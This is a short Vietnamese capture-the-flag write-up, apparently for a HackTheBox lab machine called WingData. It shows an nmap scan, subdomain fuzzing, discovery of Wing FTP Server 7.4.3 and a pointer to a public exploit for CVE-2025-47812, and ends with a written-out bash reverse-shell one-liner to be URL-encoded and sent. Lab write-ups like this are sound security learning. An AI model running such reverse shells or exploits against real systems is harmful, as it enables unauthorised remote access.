# WingData

<img width="1448" height="800" alt="image" src="https://github.com/user-attachments/assets/9ad83e6c-cecb-4f42-9c49-3f486b638c37" />

IP target là `10.129.1.247`, đầu tiên dùng nmap để scan các port đang mở:

```
# Nmap 7.98 scan initiated Wed Mar  4 21:21:11 2026 as: nmap -Pn -sV -p- -sC --min-rate=200 -T 4 -oN nmap_hehe -v 10.129.7.105
Nmap scan report for 10.129.7.105
Host is up (0.060s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  4 21:23:09 2026 -- 1 IP address (1 host up) scanned in 117.72 seconds
```

Target này có 2 port đang mở là 22 và 80, trong đó 80 đang chạy dịch vụ web với domain là `wingdata.htb`, website này không có gì để khai thác nhiều

<img width="1903" height="1029" alt="image" src="https://github.com/user-attachments/assets/3238e3f0-f1bc-4b6e-bc04-2a859e7d3798" />

Tiếp tục đi scan các subdomain bằng lệnh 

```
ffuf -w ~/wordlist/subdomains-top1mil-20000.txt -u http://wingdata.htb/ -H "Host: FUZZ.wingdata.htb" | grep -v "Words: 21, Lines: 10"
```

Tìm được subdomain là ftp:

<img width="1318" height="536" alt="image" src="https://github.com/user-attachments/assets/8191bf3e-b782-48b9-935e-3f6bdeabf83c" />

Và có thể thấy được phiên bản của dịch vụ này là `Wing FTP Server v7.4.3`

<img width="1909" height="1023" alt="image" src="https://github.com/user-attachments/assets/a14c953e-b7d6-4f8f-a40d-e45bec9818f2" />

Search google tìm poc thì xuất hiện [CVE-2025-47812](https://www.exploit-db.com/exploits/52347), vuln này có dẫn đến RCE:

<img width="1528" height="946" alt="image" src="https://github.com/user-attachments/assets/042845c5-5ee3-41aa-8147-174f6b740116" />

Tạo reverse shell:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.143/1234 0>&1'
```

Encode url lại và chạy script:

<img width="778" height="239" alt="image" src="https://github.com/user-attachments/assets/5f161361-2b17-416d-a5f8-69aaf669d5c4" />













